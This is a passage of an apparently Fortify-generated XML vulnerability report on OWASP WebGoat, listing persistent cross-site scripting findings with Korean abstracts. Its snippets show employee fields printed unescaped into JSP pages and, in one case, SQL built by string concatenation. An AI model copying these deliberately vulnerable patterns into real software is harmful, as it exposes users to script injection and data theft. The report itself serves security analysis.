<Snippet>							EmployeeStub stub = (EmployeeStub) i.next();
								%&gt;
								&lt;option value="&lt;%=Integer.toString(stub.getId())%&gt;"&gt;&lt;%=stub.getFirstName() + " " + stub.getLastName()%&gt;&lt;/option&gt;
						&lt;%}%&gt;
						&lt;/select&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ListStaff.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/ListStaff.java</FilePath>
<LineStart>98</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		answer_results.beforeFirst();
		while (answer_results.next())</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="B8BE10622F380289E1E43FAEE1A2EF7C" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 34 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/EditProfile.jsp</FilePath>
<LineStart>34</LineStart>
<Snippet>						City/State: 
					&lt;TD&gt;
						&lt;input class="lesson_text_db" name="&lt;%=CrossSiteScripting.ADDRESS2%&gt;" type="text" value="&lt;%=employee.getAddress2()%&gt;"/&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/ViewProfile.java</FilePath>
<LineStart>112</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="7C59313CAFD8929DCB3FB2E52F4E5E9C" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 51 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/ViewProfile.jsp</FilePath>
<LineStart>51</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;%=employee.getStartDate()%&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/ViewProfile.java</FilePath>
<LineStart>112</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="DAC81532D5C6702C6246194DF44DA10C" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 94 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/EditProfile.jsp</FilePath>
<LineStart>94</LineStart>
<Snippet>							EmployeeStub stub = (EmployeeStub) i.next();
								%&gt;
								&lt;option value="&lt;%=Integer.toString(stub.getId())%&gt;"&gt;&lt;%=stub.getFirstName() + " " + stub.getLastName()%&gt;&lt;/option&gt;
						&lt;%}%&gt;
						&lt;/select&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ListStaff.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/ListStaff.java</FilePath>
<LineStart>98</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		answer_results.beforeFirst();
		while (answer_results.next())</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="D08D8795E3509CB368735E7CEE737A46" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ListStaff.jsp의 _jspService() 메서드가 25 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ListStaff.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/ListStaff.jsp</FilePath>
<LineStart>25</LineStart>
<Snippet>					{
						EmployeeStub stub = (EmployeeStub) i.next();%&gt;
						&lt;option value="&lt;%=Integer.toString(stub.getId())%&gt;"&gt;&lt;%=stub.getFirstName() + " " + stub.getLastName()+ " (" + stub.getRole() + ")"%&gt;&lt;/option&gt;&lt;%
					}%&gt;
  &lt;/select&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/ViewProfile.java</FilePath>
<LineStart>112</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="9B7E19AECF616878FE161D62139995BA" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 66 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/EditProfile.jsp</FilePath>
<LineStart>66</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;input class="lesson_text_db" name="&lt;%=RoleBasedAccessControl.CCN%&gt;" type="text" value="&lt;%=employee.getCcn()%&gt;"/&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/ViewProfile.java</FilePath>
<LineStart>132</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="807C737ED4C1E828AC3197228C1ED3E7" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 22 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/EditProfile.jsp</FilePath>
<LineStart>22</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
					 	&lt;input class="lesson_text_db" name="&lt;%=CrossSiteScripting.LAST_NAME%&gt;" type="text" value="&lt;%=employee.getLastName()%&gt;"/&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/ViewProfile.java</FilePath>
<LineStart>118</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="B4B0E389FD2D92278AFBB21694B538DB" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 67 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/EditProfile.jsp</FilePath>
<LineStart>67</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;input class="lesson_text_db" name="&lt;%=CrossSiteScripting.CCN%&gt;" type="text" value="&lt;%=employee.getCcn()%&gt;"/&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>EditProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/EditProfile.java</FilePath>
<LineStart>97</LineStart>
<Snippet>				ResultSet.CONCUR_READ_ONLY);
		answer_statement.setInt(1, subjectUserId);
		ResultSet answer_results = answer_statement.executeQuery();
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.PreparedStatement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="F95C8C226ED1EDEB04AB7011CB62EEC7" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 66 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/EditProfile.jsp</FilePath>
<LineStart>66</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;input class="lesson_text_db" name="&lt;%=RoleBasedAccessControl.CCN%&gt;" type="text" value="&lt;%=employee.getCcn()%&gt;"/&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/ViewProfile.java</FilePath>
<LineStart>112</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="C43021DB236A0B8092F75393B7921988" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 16 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/ViewProfile.jsp</FilePath>
<LineStart>16</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;%=employee.getFirstName()%&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>EditProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/EditProfile.java</FilePath>
<LineStart>97</LineStart>
<Snippet>				ResultSet.CONCUR_READ_ONLY);
		answer_statement.setInt(1, subjectUserId);
		ResultSet answer_results = answer_statement.executeQuery();
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.PreparedStatement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="7B5C17E840813735C55A90AFAF4A1F24" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 21 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/EditProfile.jsp</FilePath>
<LineStart>21</LineStart>
<Snippet>						Last Name:					&lt;/TD&gt;
					&lt;TD width="196"&gt;
					 	&lt;input class="lesson_text_db" name="&lt;%=RoleBasedAccessControl.LAST_NAME%&gt;" type="text" value="&lt;%=employee.getLastName()%&gt;"/&gt;
				  &lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/ViewProfile.java</FilePath>
<LineStart>132</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="FC7DDB293EB1E7A778F5FC1B2ABB2A3A" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 22 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/EditProfile.jsp</FilePath>
<LineStart>22</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
					 	&lt;input class="lesson_text_db" name="&lt;%=SQLInjection.LAST_NAME%&gt;" type="text" value="&lt;%=employee.getLastName()%&gt;"/&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>Login.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/Login.java</FilePath>
<LineStart>194</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		answer_results.beforeFirst();
		while (answer_results.next())</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="13568617F8150A00F07F8BB4D7E1D02C" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 29 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/EditProfile.jsp</FilePath>
<LineStart>29</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;input class="lesson_text_db" name="&lt;%=SQLInjection.ADDRESS1%&gt;" type="text" value="&lt;%=employee.getAddress1()%&gt;"/&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>EditProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/EditProfile.java</FilePath>
<LineStart>97</LineStart>
<Snippet>				ResultSet.CONCUR_READ_ONLY);
		answer_statement.setInt(1, subjectUserId);
		ResultSet answer_results = answer_statement.executeQuery();
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.PreparedStatement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="4855682D970402453D9F3E2FD22C4D9F" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 22 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/ViewProfile.jsp</FilePath>
<LineStart>22</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
					 	&lt;span class="lesson_text_db"&gt;&lt;%=employee.getLastName()%&gt;&lt;/span&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/ViewProfile.java</FilePath>
<LineStart>132</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="AE6A912B67FF3A95A71797F82E95AB77" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 18 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/ViewProfile.jsp</FilePath>
<LineStart>18</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;%=employee.getFirstName()%&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/ViewProfile.java</FilePath>
<LineStart>118</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="2200A9A9AD4AB900752847263C8C4E24" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 41 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/ViewProfile.jsp</FilePath>
<LineStart>41</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;span class="lesson_text_db"&gt;&lt;%=employee.getPhoneNumber()%&gt;&lt;/span&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>EditProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/EditProfile.java</FilePath>
<LineStart>97</LineStart>
<Snippet>				ResultSet.CONCUR_READ_ONLY);
		answer_statement.setInt(1, subjectUserId);
		ResultSet answer_results = answer_statement.executeQuery();
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.PreparedStatement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="06CA400013FB6F492D5C1678976823BE" ruleID="94B3FB0E-4AED-4006-9CDD-B2B1C13747EE">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ECSFactory.java의 makeLink() 메서드가 292 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ECSFactory.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ECSFactory.java</FilePath>
<LineStart>292</LineStart>
<Snippet>	A a = new A(href);

	a.addElement(new U().addElement(text));

	a.addAttribute("style", "cursor:hand");</Snippet>
<TargetFunction>org.apache.ecs.html.U.addElement()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>StoredXss.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/StoredXss.java</FilePath>
<LineStart>343</LineStart>
<Snippet>	    // cookies, but not get confused by other users scripts

	    ResultSet results = statement.executeQuery(STANDARD_QUERY
		    + " WHERE user_name LIKE '" + getNameroot(s.getUserName())
		    + "%'");</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="8A6825BE541DD9EFBB59B4BFBBCE5636" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 89 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/EditProfile.jsp</FilePath>
<LineStart>89</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;			
						&lt;input class="lesson_text_db" name="&lt;%=RoleBasedAccessControl.DISCIPLINARY_DATE%&gt;" type="text" value="&lt;%=employee.getDisciplinaryActionDate()%&gt;"/&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>EditProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/EditProfile.java</FilePath>
<LineStart>97</LineStart>
<Snippet>				ResultSet.CONCUR_READ_ONLY);
		answer_statement.setInt(1, subjectUserId);
		ResultSet answer_results = answer_statement.executeQuery();
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.PreparedStatement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="3C615EB487ECC2F7EB71C114A2889A7D" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 67 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/EditProfile.jsp</FilePath>
<LineStart>67</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;input class="lesson_text_db" name="&lt;%=CrossSiteScripting.CCN%&gt;" type="text" value="&lt;%=employee.getCcn()%&gt;"/&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/ViewProfile.java</FilePath>
<LineStart>132</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="DD4C772FE8BC7649CC55E4F3B157A733" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 24 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/ViewProfile.jsp</FilePath>
<LineStart>24</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
					 	&lt;%=employee.getLastName()%&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>EditProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/EditProfile.java</FilePath>
<LineStart>97</LineStart>
<Snippet>				ResultSet.CONCUR_READ_ONLY);
		answer_statement.setInt(1, subjectUserId);
		ResultSet answer_results = answer_statement.executeQuery();
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.PreparedStatement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="15FA09279959B09592CF6005D849D989" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 67 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
